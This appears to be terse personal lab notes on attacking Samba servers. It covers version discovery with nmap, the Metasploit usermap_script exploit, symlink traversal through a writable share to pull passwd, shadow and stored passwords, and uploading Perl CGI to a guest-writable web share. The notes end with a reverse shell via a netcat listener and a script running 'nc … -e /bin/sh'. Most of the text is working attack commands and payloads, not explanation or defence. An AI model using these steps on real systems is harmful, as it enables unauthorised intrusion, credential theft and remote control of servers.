CVE-2017-7494 SambaCry

we need exact samba version

nmap --script smb-os-discovery -p445 192.168.13.29
here Samba version of 3.0.20

 searchsploit samba 3.0.20
 
 Metasploit module Username map script
 
 affects Samba
versions 3.0.0 through 3.0.25rc3 and exists in non-default
configurations where the “username map script” option is
enabled,

msf> use exploit/multi/samba/usermap_script

python -c 'import pty; pty.spawn("/bin/sh")'
-------------------------

use auxiliary/admin/smb/samba_symlink_traversal

A pre-requisite to this particular vulnerability requires that the Samba server contains a
writeable share and that the “widelinks” parameter in the smb.conf file is set
with a value of “yes.”

1.
smbmap -H 192.168.12.12
run

2.
smbclient \\\\192.168.13.29\\tmp -N      >>> we see a new share with the name rootfs

use get and put commands to upload and download files

e.g. passwd or shadow

We can use the tar command to archive all and download it
tar c ../tmp/all_files.tar *

grep -r “password” * 2>&1 /dev/null we find passwords e.g MySQLP@ssw0rd!

-------------------------

nmap --script smb-os-discovery 192.168.13.21 -p 445
samba 4.7.3 debian is "patched"

smbmap -H 192.168.13.21
www is read, write access for guest sessions
good for us we can find config files, creds for web server

smbclient \\\\192.168.13.21\\www -N
“index.pl” in the web root indicates that the
server is likely configured to interpret CGI
programs because pl is perl and pearl likes CGI

get index.pl
nmap -sT 192.168.13.21 --max-retries 1 -n --open

we surfe to the index.pl script in the www share

with smbclient and put, we upload a test.pl

test.pl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
system("id");

smbclient \\\\192.168.13.21\\www -N

smb: \> put test.pl

we use a perl-reverse-shell.pl
and modify it
$ip and $port to attacker ip and port

 put perl-reverse-shell.pl 
 
 start a netcat listener
 nc -n -l -v -p 1234
 
 we surve to file perl-reverse-shell.pl
 
 OR we could change the test.pl to
 #!/usr/bin/perl
print "Content-type: text/html\n\n";
system("nc 192.168.13.18 1234 -e /bin/sh");
